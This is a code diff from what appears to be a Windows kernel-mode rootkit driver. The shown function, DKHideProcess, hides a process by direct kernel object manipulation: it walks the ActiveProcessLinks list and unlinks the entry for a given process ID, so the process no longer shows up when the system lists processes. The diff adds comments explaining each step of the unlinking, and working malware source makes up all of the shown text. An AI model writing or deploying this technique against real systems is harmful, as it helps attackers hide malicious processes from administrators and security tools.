@@ -51,33 +51,44 @@ NTSTATUS kernelobjs_hiding::HideSystemModule(DRIVER_OBJECT* DriverObject, PUNICO
 
 NTSTATUS process::DKHideProcess(ULONG64 ProcessId, BOOL IsStrict) {
 	// Assumes: PID is validated and not 0 in the entry to this function
+	// Note: PACTEPROCESS is a REd interpretation of PEPROCESS for offset resolving
 	LIST_ENTRY* CurrentList = NULL;
 	LIST_ENTRY* PreviousList = NULL;
 	LIST_ENTRY* NextList = NULL;
-	PACTEPROCESS CurrentProcess = (PACTEPROCESS)PsInitialSystemProcess;
-	LIST_ENTRY* LastProcessFlink = &CurrentProcess->ActiveProcessLinks;
+	PACTEPROCESS CurrentProcess = (PACTEPROCESS)PsInitialSystemProcess;  // First process in list
+	LIST_ENTRY* LastProcessFlink = &CurrentProcess->ActiveProcessLinks;  // Last process->first process
+	
+	// Move one process forward, no need to go over initial process:
 	PreviousList = LastProcessFlink;
 	CurrentList = PreviousList->Flink;
-	CurrentProcess = (PACTEPROCESS)((ULONG64)CurrentList - offsetof(struct _ACTEPROCESS, ActiveProcessLinks));
+	CurrentProcess = (PACTEPROCESS)((ULONG64)CurrentList - offsetof(struct _ACTEPROCESS, 
+		ActiveProcessLinks));
 	NextList = CurrentList->Flink;
 	while (CurrentList != LastProcessFlink) {
 		if ((ULONG64)CurrentProcess->UniqueProcessId == ProcessId) {
-			PreviousList->Flink = NextList;
-			NextList->Blink = PreviousList;
-			ProcessHide.AddToHidden((PEPROCESS)CurrentProcess);
-			DbgPrintEx(0, 0, "KMDFdriver process - HideProcess(DKOM), Found process to hide (%llu)\n", ProcessId);
+
+			// Current process ID = PID that was requested to be hidden:
+			PreviousList->Flink = NextList;  // LastProcess -- (hidden not visible) -> NextProcess
+			NextList->Blink = PreviousList;  // LastProcess <- (hidden not visible) -- NextProcess
+			ProcessHide.AddToHidden((PEPROCESS)CurrentProcess);  // Add to documented list
+			DbgPrintEx(0, 0, "KMDFdriver process - HideProcess(DKOM), Found process to hide (%llu)\n",
+				ProcessId);
 			CurrentList->Blink = CurrentList;
 			CurrentList->Flink = CurrentList;
 			return STATUS_SUCCESS;
 		}
+
+		// Move to the next process:
 		PreviousList = CurrentList;
 		CurrentList = NextList;
 		NextList = CurrentList->Flink;
-		CurrentProcess = (PACTEPROCESS)((ULONG64)CurrentList - offsetof(struct _ACTEPROCESS, ActiveProcessLinks));
+		CurrentProcess = (PACTEPROCESS)((ULONG64)CurrentList - offsetof(struct _ACTEPROCESS,
+			ActiveProcessLinks));
 	}
-	DbgPrintEx(0, 0, "KMDFdriver process - HideProcess(DKOM), Did not find process to hide (%llu)\n", ProcessId);
+	DbgPrintEx(0, 0, "KMDFdriver process - HideProcess(DKOM), Did not find process to hide (%llu)\n",
+		ProcessId);
 	if (IsStrict) {
-		return STATUS_NOT_FOUND;
+		return STATUS_NOT_FOUND;  // Returns error if process was not found
 	}
 	return STATUS_SUCCESS;
 }
